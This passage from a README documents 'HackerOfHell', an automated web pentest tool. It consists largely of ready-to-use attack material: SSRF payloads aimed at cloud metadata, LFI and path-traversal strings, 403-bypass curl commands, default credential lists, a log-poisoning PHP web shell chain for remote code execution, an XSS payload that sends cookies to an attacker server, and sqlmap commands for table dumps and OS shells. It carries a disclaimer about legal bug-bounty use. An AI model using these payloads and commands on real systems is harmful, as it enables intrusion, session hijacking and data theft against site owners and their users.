https:redirect-test.invalid            # colon bypass
%2F%2Fredirect-test.invalid            # URL encoded


# ─── SSRF ─────────────────────────────────────────────────────────
# 6 payloads targeting cloud metadata:
http://169.254.169.254/latest/meta-data/    # AWS EC2
http://metadata.google.internal/            # GCP
http://100.100.100.200/latest/meta-data/    # Alibaba Cloud
http://127.0.0.1/                           # Localhost
http://[::1]/                              # IPv6 localhost
http://0.0.0.0/                            # All interfaces
# Parameters tested: url, file, path, dest, src, redirect,
#                    proxy, load, fetch, image, document, import


# ─── LFI / PATH TRAVERSAL ─────────────────────────────────────────
# 7 payloads:
../../../etc/passwd                                    # basic
....//....//....//etc/passwd                           # double encode
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd               # URL encoded
..%252f..%252f..%252fetc%252fpasswd                    # double URL encoded
/etc/passwd                                            # absolute
php://filter/convert.base64-encode/resource=/etc/passwd  # PHP filter
file:///etc/passwd                                     # file wrapper
# Verified by checking response for: root:.*:0:0:


# ─── 403 BYPASS ───────────────────────────────────────────────────
curl -H "X-Original-URL: /admin"              https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1"          https://target.com/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin
curl --path-as-is "https://target.com/./admin"
curl "https://target.com/%2fadmin"             # URL encoded slash


# ─── DEFAULT CREDENTIALS ──────────────────────────────────────────
# 12 combinations auto-tested on login endpoints:
admin:admin           admin:password        admin:123456
admin:admin123        admin:letmein         admin:changeme
root:root             root:toor
test:test             guest:guest           user:user
administrator:administrator
# Checked for redirect to: dashboard, admin, home, panel, account


# ─── SECURITY HEADERS ─────────────────────────────────────────────
curl -sk -I https://target.com | grep -iE \
  "strict-transport-security|content-security-policy|x-frame-options|\
x-content-type-options|referrer-policy|permissions-policy"
# Missing headers = LOW severity finding with remediation
```
Output folder: `05_poc/`
Key files: `xss_results.json`, `sqlmap_results.csv`, `sqlmap/`
---
─── Phase 6: Bug Chain Analysis ───
HackerOfHell automatically detects vulnerability chains — combinations of bugs that create higher combined impact.
```
Bug Chains Detected:

  ⛓  XSS + Missing CSP
      CVSS 9.3 — CRITICAL
      XSS with no Content-Security-Policy = unrestricted JS execution.
      No sandbox, no restrictions on data theft.

  ⛓  Open Redirect + XSS → Account Takeover
      CVSS 9.6 — CRITICAL
      Use open redirect to deliver XSS from trusted domain.
      Bypasses same-origin restrictions → cookie/token theft.

  ⛓  SSRF + Exposed Internal Services
      CVSS 9.9 — CRITICAL
      SSRF reaches internal Redis/MongoDB/Elasticsearch →
      Full infrastructure compromise possible.

  ⛓  SQLi + Direct Database Port Exposure
      CVSS 9.9 — CRITICAL
      SQL injection + open DB port = direct data exfiltration
      without needing SQLmap.

  ⛓  LFI → Log Poisoning → RCE
      CVSS 9.9 — CRITICAL
      Inject PHP into web server access.log via User-Agent,
      then include the log file via LFI = Remote Code Execution.
```
Output folder: `06_chains/`
---
─── Phase 7: Professional Report Generation ───
```bash
# Report auto-generated at:
~/hackerofhell/target.com/07_report/hackerofhell_target.com_TIMESTAMP.html

# Open it
firefox ~/hackerofhell/target.com/07_report/hackerofhell_*.html
```
Report contains:
HackerOfHell ASCII banner
RAJESH BAJIYA | HACKEROFHELL author stamp
Target domain + scan date + mode + classification
Calculated Risk Score
Findings by severity (bar chart)
Scan statistics (Total/Critical/High/Medium/Low/Chains)
Vulnerability Chains section
Every confirmed finding with: severity badge, CVSS score, affected URL, parameter, evidence, copy-paste PoC commands, remediation guide
Footer: RAJESH BAJIYA | HACKEROFHELL | CONFIDENTIAL
---
🐛 Vulnerability Coverage
#	Vulnerability Type	Severity	CVSS	Tool Used
01	SQL Injection	🔴 CRITICAL	9.8	sqlmap
02	Remote Code Execution	🔴 CRITICAL	9.5	nuclei CVE templates
03	SSRF — Cloud Metadata Exfil	🔴 CRITICAL	9.3	custom curl
04	Local File Inclusion (LFI)	🔴 CRITICAL	9.1	custom curl
05	Hardcoded Secrets in JS	🔴 CRITICAL	9.1	custom regex
06	Default / Weak Credentials	🔴 CRITICAL	9.8	custom curl
07	Exposed .env / .git / config	🔴 CRITICAL	9.1	curl
08	Spring Actuator / heapdump	🔴 CRITICAL	9.1	curl
09	DNS Zone Transfer	🟠 HIGH	7.5	dig
10	Subdomain Takeover	🟠 HIGH	8.1	dnsx + curl
11	Cross-Site Scripting (XSS)	🟠 HIGH	7.4	dalfox
12	CORS Misconfiguration	🟠 HIGH	7.5	curl
13	Exposed Admin Panels	🟠 HIGH	7.2	gobuster
14	403 Access Control Bypass	🟠 HIGH	7.5	curl
15	Exposed Backup Files	🟠 HIGH	7.5	curl
16	Unauthenticated API Access	🟠 HIGH	8.2	curl
17	Exposed Internal Services	🟠 HIGH	8.5	nmap
18	Open Redirect	🟡 MEDIUM	6.1	curl
19	Sensitive File Exposure	🟡 MEDIUM	5.3–9.1	curl
20	WordPress Vulnerabilities	🟡 MEDIUM	varies	wpscan
21	Nuclei CVE Matches	varies	varies	nuclei
22	Missing Security Headers	🟢 LOW	4.3	curl
23	Misconfigured Cloud Services	🔴 CRITICAL	varies	nuclei
---
⛓️ Bug Chain Analysis
HackerOfHell is one of the only tools that automatically combines findings into escalation chains.
Example — LFI → RCE
```
Phase 5 Found: LFI on https://target.com/page?file=../../../etc/passwd

Chain Analysis automatically detects escalation path:

  Step 1 — Inject PHP code into access log:
    curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

  Step 2 — Include the poisoned log via LFI:
    https://target.com/page?file=../../../var/log/apache2/access.log&cmd=id

  Result: Remote Code Execution
  Combined CVSS: 9.9 — CRITICAL
```
Example — Open Redirect + XSS → Account Takeover
```
Phase 5 Found:
  XSS     on https://target.com/search?q=<payload>
  Redirect on https://target.com/login?returnUrl=https://evil.com

Chain Analysis detects:

  Step 1 — Craft combined payload URL:
    https://target.com/login?returnUrl=https://target.com/search?q=
    <script>fetch('https://your-server?c='+document.cookie)</script>

  Step 2 — Victim clicks (looks like legit target.com URL)
  Step 3 — XSS fires, session cookie stolen
  Step 4 — Attacker logs in with stolen cookie

  Result: Full Account Takeover
  Combined CVSS: 9.6 — CRITICAL
```
---
📂 Output Folder Structure
```
~/hackerofhell/
└── target.com/
    │
    ├── 01_recon/                     ← Passive Intelligence
    │   ├── all_subs.txt              All unique subdomains found
    │   ├── subs_subfinder.txt        Subfinder results
    │   ├── subs_amass.txt            Amass results
    │   ├── subs_bruteforce.txt       DNS brute force results
    │   ├── subs_crtsh.txt            Certificate transparency results
    │   ├── dns_full.txt              All DNS records (A,AAAA,CNAME,MX,NS,TXT)
    │   ├── all_urls.txt              All historical URLs merged
    │   ├── urls_gau.txt              GAU results
    │   ├── urls_wayback.txt          Wayback Machine results
    │   ├── urls_commoncrawl.txt      Common Crawl results
    │   ├── whois.txt                 WHOIS data
    │   ├── ipinfo.json               IP + ASN + org info
    │   ├── emails.txt                Discovered email addresses
    │   └── google_dorks.txt          Ready-to-use Google dorks
    │
    ├── 02_enum/                      ← Active Enumeration
    │   ├── live_hosts.txt            Live subdomains with status/tech
    │   ├── live_urls.txt             Clean list of live URLs
    │   ├── nmap_top1000.txt          Nmap top 1000 scan
    │   ├── nmap_top1000.xml          Nmap XML (for tools like Metasploit)
    │   ├── nmap_services.txt         Service version detection
    │   ├── nmap_allports.txt         Full 65535 port scan (--deep only)
    │   ├── waf.txt                   WAF detection results
    │   ├── whatweb.json              Technology stack JSON
    │   └── wpscan.json               WordPress scan (if WP detected)
    │
    ├── 03_crawl/                     ← Content Discovery
    │   ├── robots_https.txt          robots.txt content
    │   ├── robots_paths.txt          Disallowed paths from robots.txt
    │   ├── sitemap_urls.txt          All URLs from sitemaps
    │   ├── admin_found.txt           Accessible admin panels
    │   ├── ffuf_dirs.json            Directory fuzzing results
    │   ├── api_endpoints.json        API endpoints found
    │   ├── js_files.txt              JavaScript files list
    │   ├── js_secrets.txt            Hardcoded secrets found in JS
    │   └── param_urls.txt            URLs with parameters (used for injection)
    │
    ├── 04_vuln/                      ← Automated Scanning
    │   └── nuclei_results.jsonl      Nuclei findings (raw JSON lines)
    │
    ├── 05_poc/                       ← Verified Vulnerabilities
    │   ├── xss_results.json          Confirmed XSS findings
    │   ├── sqlmap/                   Full SQLmap output directory
    │   ├── sqlmap_results.csv        SQLi summary (confirmed only)
    │   ├── zone_transfer_NS.txt      Zone transfer data (if found)
    │   └── auth_cookies.txt          Session cookies from auth tests
    │
    ├── 06_chains/                    ← Chain Analysis Data
    │
    ├── 07_report/                    ← ⭐ FINAL REPORT
    │   └── hackerofhell_target.com_20241025_143022.html
    │
    ├── findings.json                 All findings (machine-readable)
    └── hackerofhell.log              Complete scan log with timestamps
```
---
📊 Reading the HTML Report
```bash
# Open the report
firefox ~/hackerofhell/target.com/07_report/hackerofhell_*.html

# Can't find it?
find ~/hackerofhell -name "*.html" 2>/dev/null

# Copy report to Desktop
cp ~/hackerofhell/target.com/07_report/hackerofhell_*.html ~/Desktop/
```
Report structure:
```
╔══════════════════════════════════════════════════════╗
║  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗   ║  ← ASCII Banner
║  ...   HACKEROFHELL OF HELL                          ║
╠═════════════════════════════╦════════════════════════╣
║  PENETRATION TEST REPORT    ║   Risk Score: 87       ║
║  Target: target.com         ║                        ║
║  Author: RAJESH BAJIYA      ║                        ║
║  Handle: HACKEROFHELL       ║                        ║
╠══════════════╦══════════════╩══════╦══════════════════╣
║ Severity     ║ Statistics          ║ About            ║
║ CRITICAL ███ ║ Total:     12       ║ Tool: HOH v3.0   ║
║ HIGH     ██  ║ Critical:   3       ║ Author: R.BAJIYA ║
║ MEDIUM   █   ║ High:       5       ║ Only confirmed   ║
║ LOW      ░   ║ Chains:     2       ║ bugs shown       ║
╠══════════════╩═════════════════════╩══════════════════╣
║ ⛓ VULNERABILITY CHAINS                               ║
║  ┌──────────────────────────────────────────────┐    ║
║  │ ⛓ CHAIN — CRITICAL — CVSS 9.9              │    ║
║  │ LFI → Log Poisoning → RCE                   │    ║
║  │ (description of escalation path)            │    ║
║  └──────────────────────────────────────────────┘    ║
╠══════════════════════════════════════════════════════╣
║ CONFIRMED FINDINGS (sorted by severity)              ║
║  ┌──────────────────────────────────────────────┐    ║
║  │ [CRITICAL] CVSS 9.8  SQL Injection  sqlmap ▼ │    ║  ← Click to expand
║  ├──────────────────────────────────────────────┤    ║
║  │ URL:       https://target.com/api/login      │    ║
║  │ Parameter: username                          │    ║
║  │ Evidence:  Blind time-based confirmed        │    ║
║  │ PoC:  sqlmap -u '...' --dbs       [⎘ COPY]  │    ║  ← Copy PoC button
║  │ Fix:  Use parameterized queries              │    ║
║  └──────────────────────────────────────────────┘    ║
║  ... (all other findings follow same format)         ║
╠══════════════════════════════════════════════════════╣
║  RAJESH BAJIYA | HACKEROFHELL | CONFIDENTIAL         ║  ← Author stamp
╚══════════════════════════════════════════════════════╝
```
---
📖 Manual Commands Cheatsheet
A reference for running individual modules by hand when needed.
Subdomain Enumeration
```bash
# Subfinder
subfinder -d target.com -silent -all -o subs.txt

# Amass passive
amass enum -passive -d target.com -o subs_amass.txt

# DNS brute force
dnsx -d target.com \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -silent -o subs_dns.txt

# crt.sh (certificate transparency)
curl -sk "https://crt.sh/?q=%.target.com&output=json" | \
  python3 -c "
import json,sys
data=json.load(sys.stdin)
names=set()
for e in data:
  for n in e.get('name_value','').split('\n'):
    n=n.strip().lstrip('*.')
    if n.endswith('target.com'): names.add(n)
print('\n'.join(sorted(names)))
"

# Merge all and deduplicate
cat subs*.txt | sort -u > all_subs.txt
wc -l all_subs.txt
```
DNS Intelligence
```bash
# Full DNS records for all subdomains
dnsx -l all_subs.txt -a -aaaa -cname -mx -ns -txt -resp

# Zone transfer attempt
dig NS target.com
dig AXFR target.com @ns1.target.com
dig AXFR target.com @ns2.target.com

# Check specific record
dig A target.com +short
dig CNAME sub.target.com +short
dig MX target.com +short

# Reverse DNS
dig -x 1.2.3.4 +short
```
Port Scanning
```bash
# Quick top-1000 scan
nmap -sS -T3 --open --top-ports 1000 target.com

# Full service detection
nmap -sV -sC -A --open -p 80,443,8080,8443 target.com

# Full port scan (all 65535)
nmap -sS -T4 --open -p- target.com

# UDP top-100
sudo nmap -sU --top-ports 100 target.com

# Save to file
nmap -sV --open --top-ports 1000 -oN nmap.txt -oX nmap.xml target.com

# Search for specific service in results
grep "open" nmap.txt | grep "http\|ssl\|web"
```
Live Host Probing
```bash
# Full probe with all info
httpx -l all_subs.txt \
  -title -tech-detect -status-code -content-length \
  -follow-redirects -ip -cdn -silent -o live.txt

# Quick check — status codes only
httpx -l all_subs.txt -status-code -silent

# Only show 200s
httpx -l all_subs.txt -status-code -silent | grep " 200"

# Check specific path on all hosts
httpx -l all_subs.txt -path /admin -status-code -silent | grep " 200"
```
Directory Brute Force
```bash
# Standard directory scan
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -o dirs.txt -q --no-error

# Admin panels only
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.txt \
  -o admins.txt -q

# File extensions
gobuster dir -u https://target.com \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -x php,txt,html,xml,json,bak,old -o files.txt

# Fast fuzzing with ffuf
ffuf -u https://target.com/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,301,302,403 -t 50 -o result.json -of json

# API endpoints
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,401,403
```
Nuclei
```bash
# Full vulnerability scan
nuclei -u https://target.com -t ~/nuclei-templates/ \
  -severity critical,high,medium -silent

# Scan list of URLs
nuclei -l live_urls.txt -t ~/nuclei-templates/ \
  -tags cve,rce,sqli,xss,ssrf,lfi -severity critical,high

# Specific template
nuclei -u https://target.com \
  -t ~/nuclei-templates/cves/2024/CVE-2024-xxxx.yaml

# Only CVEs
nuclei -u https://target.com -t ~/nuclei-templates/cves/ -silent

# Update templates
nuclei -update-templates
```
XSS Testing
```bash
# Dalfox single URL
dalfox url "https://target.com/search?q=test" --skip-bav

# Dalfox file of URLs
dalfox file param_urls.txt --skip-bav --no-spinner --format json -o xss.json

# Manual basic check
curl -sk "https://target.com/search?q=<script>alert(1)</script>" \
  | grep -i "alert"

# Check reflection
curl -sk "https://target.com/search?q=HACKEROFHELL" | grep "HACKEROFHELL"
```
SQL Injection
```bash
# Basic URL test
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# POST form
sqlmap -u "https://target.com/login" \
  --data "username=admin&password=test" \
  --batch --level=2 --risk=2

# Full scan on file
sqlmap -m param_urls.txt --batch \
  --level=2 --risk=2 --forms --crawl=2

# Dump specific table
sqlmap -u "https://target.com/page?id=1" \
  --batch -D database_name -T users --dump

# OS shell (if privileged DB user)
sqlmap -u "https://target.com/page?id=1" --os-shell --batch
```
CORS
```bash
# Test origin reflection
curl -sk -H "Origin: https://evil.test" \
  https://target.com/api/user -I | grep -i "access-control"

# Null origin
curl -sk -H "Origin: null" \
  https://target.com/api/user -I | grep -i "access-control"

# Subdomain confusion
curl -sk -H "Origin: https://target.com.evil.test" \
  https://target.com/api/user -I | grep -i "access-control"
```
SSRF
```bash
# AWS metadata
curl -sk "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/"

# Internal port scan via SSRF
for port in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    --max-time 3 "https://target.com/proxy?url=http://127.0.0.1:$port")
  echo "Port $port: HTTP $code"
done
```
LFI
```bash
# Basic
curl -sk "https://target.com/page?file=../../../etc/passwd"

# URL encoded
curl -sk "https://target.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd"

# Double encoded
curl -sk "https://target.com/page?file=..%252F..%252F..%252Fetc%252Fpasswd"

# PHP filter (read PHP source code as base64)
curl -sk "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php" \
  | base64 -d
```
Security Headers Check
```bash
# Check all security headers
curl -sk -I https://target.com | grep -iE \
  "strict-transport|content-security-policy|x-frame-options|\
x-content-type-options|referrer-policy|permissions-policy"

# What's MISSING
echo "=== Checking security headers for target.com ==="
headers=$(curl -sk -I https://target.com)
for h in "strict-transport-security" "content-security-policy" \
         "x-frame-options" "x-content-type-options" \
         "referrer-policy" "permissions-policy"; do
  echo "$headers" | grep -qi "$h" \
    && echo "[✓] $h" \
    || echo "[✗] MISSING: $h"
done
```
Sensitive Files Manual Check
```bash
# Quick scan
for path in \
  /.env /.env.local /.git/config /.git/HEAD \
  /phpinfo.php /server-status /wp-config.php \
  /swagger.json /openapi.json \
  /actuator/env /actuator/heapdump \
  /.htpasswd /composer.json /Dockerfile; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    --max-time 5 "https://target.com$path")
  [[ "$code" == "200" ]] && echo "[FOUND] https://target.com$path (HTTP $code)"
done
```
---
🔧 Troubleshooting
Permission Denied / Script Not Running
```bash
# Check file exists
ls -la ~/autopwn/hackerofhell.sh

# Fix permissions
chmod +x ~/autopwn/hackerofhell.sh

# Always run with sudo
sudo ~/autopwn/hackerofhell.sh -t target.com
```
GUI Doesn't Open
```bash
# Install tkinter
sudo apt install python3-tk -y

# Test tkinter
python3 -c "import tkinter; print('tkinter OK')"

# Launch GUI
python3 ~/autopwn/hackerofhell_gui.py
```
Go Tools Not Found After Install
```bash
# Add to PATH
echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.bashrc
source ~/.bashrc

# Check location
ls ~/go/bin/

# Verify each tool
which subfinder httpx nuclei dalfox gau waybackurls
```
Nuclei Templates Missing
```bash
# Update templates
nuclei -update-templates

# Check template count
ls ~/nuclei-templates/ | wc -l
find ~/nuclei-templates -name "*.yaml" | wc -l
```
Report Not Found After Scan
```bash
# Search everywhere
find ~/ -name "hackerofhell_*.html" 2>/dev/null

# Check if scan completed
tail -50 ~/hackerofhell/target.com/hackerofhell.log

# Check output folder exists
ls ~/hackerofhell/target.com/07_report/
```
Scan Runs But No Findings
```bash
# Check findings.json
cat ~/hackerofhell/target.com/findings.json | python3 -m json.tool

# Check nuclei ran
cat ~/hackerofhell/target.com/04_vuln/nuclei_results.jsonl | wc -l

# Try manual nuclei
nuclei -u https://target.com -t ~/nuclei-templates/http/technologies/ -silent

# Target may be well-hardened — check log
grep "\[\+\]" ~/hackerofhell/target.com/hackerofhell.log
```
Tool Install Fails (Go)
```bash
# Upgrade Go
sudo apt remove golang-go -y
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
```
Nmap Requires Root
```bash
# Always run hackerofhell.sh with sudo
sudo ~/autopwn/hackerofhell.sh -t target.com

# Or run nmap manually with sudo
sudo nmap -sS --top-ports 1000 target.com
```
Target Behind Cloudflare (Origin IP Hidden)
```bash
# Check if Cloudflare
curl -sk -I https://target.com | grep -i "cf-ray\|cloudflare"

# Find origin IP methods:
# 1. Check DNS history
curl "https://securitytrails.com/domain/target.com/history/a"

# 2. Check shodan
curl "https://api.shodan.io/dns/resolve?hostnames=target.com&key=FREE_KEY"

# 3. Check subdomain IPs that might bypass CDN
cat ~/hackerofhell/target.com/01_recon/all_subs.txt | \
  xargs -I{} dig {} +short | sort -u | grep -v "^$"
```
---
🤝 Contributing
Contributions are welcome! Here's how to add new modules:
```bash
# Fork and clone
git clone https://github.com/RAJESHBAJIYA/hackerofhell.git
cd hackerofhell

# Create your feature branch
git checkout -b feature/ssti-module

# Add your module inside the relevant phase in hackerofhell.sh
# Follow the existing pattern:
#   log "Testing SSTI..."
#   <your test code>
#   if confirmed:
#     vuln "SSTI FOUND: $URL"
#     add_finding "SSTI" "CRITICAL" "9.3" "custom" "$URL" ...

# Test on a legal target
sudo ./hackerofhell.sh -t testphp.vulnweb.com

# Submit PR
git add .
git commit -m "Add: SSTI detection module in Phase 5"
git push origin feature/ssti-module
# Then open Pull Request on GitHub
```
Wanted Modules / Ideas
```
[ ] SSTI — Server-Side Template Injection
[ ] XXE — XML External Entity
[ ] JWT vulnerability testing (alg:none, weak secret)
[ ] OAuth misconfiguration detection
[ ] GraphQL introspection + injection testing
[ ] Docker/Kubernetes API exposure
[ ] IDOR automated testing
[ ] Host header injection
[ ] HTTP Request Smuggling
[ ] Prototype Pollution
[ ] PDF export for reports
[ ] Shodan/Censys API integration
[ ] Burp Suite extension version
[ ] HackerOne/Bugcrowd auto-submission
```
---
👤 Author & Credits
<div align="center">
```
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║    ██████╗  █████╗      ██╗███████╗███████╗██╗  ██╗         ║
║    ██╔══██╗██╔══██╗     ██║██╔════╝██╔════╝██║  ██║         ║
║    ██████╔╝███████║     ██║█████╗  ███████╗███████║         ║
║    ██╔══██╗██╔══██║██   ██║██╔══╝  ╚════██║██╔══██║         ║
║    ██║  ██║██║  ██║╚█████╔╝███████╗███████║██║  ██║         ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚══════╝╚═╝  ╚═╝         ║
║                      B A J I Y A                             ║
╚══════════════════════════════════════════════════════════════╝
```
RAJESH BAJIYA
🔥 HACKEROFHELL
Bug Bounty Hunter · Penetration Tester · Security Researcher
<br>
![GitHub](https://img.shields.io/badge/GitHub-RAJESHBAJIYA-181717?style=for-the-badge&logo=github&logoColor=white)
![Twitter](https://img.shields.io/badge/Twitter-HACKEROFHELL-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)
![BugBounty](https://img.shields.io/badge/Platform-HackerOne-494649?style=for-the-badge&logo=hackerone&logoColor=white)
<br>
---
💬 Quote
```
"The best tools are the ones that let you focus on thinking,
 not on typing the same commands over and over."

                            — RAJESH BAJIYA | HACKEROFHELL
```
---
⭐ If HackerOfHell helped you find bugs, star this repo!
```
Found a bug with this tool? ⭐ Star it.
Learned something? ⭐ Star it.
Think it's the coolest pentest tool? ⭐ Star it.
```
<br>
---
Built with 🔥 by RAJESH BAJIYA (HACKEROFHELL)
Use responsibly. Hack legally. Bug bounty only.
<br>
`#bugbounty` `#pentesting` `#kalilinux` `#automation` `#hackerofhell` `#rajeshbajiya` `#infosec` `#ethicalhacking`
</div>
---
📜 License
```
MIT License

Copyright (c) 2024 RAJESH BAJIYA (HACKEROFHELL)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED. FOR AUTHORIZED TESTING ONLY.
THE AUTHOR IS NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE.
```
---
<div align="center">
```
⚡ HACKEROFHELL v3.0 ULTIMATE ⚡
Built by RAJESH BAJIYA — HACKEROFHELL
```
</div>
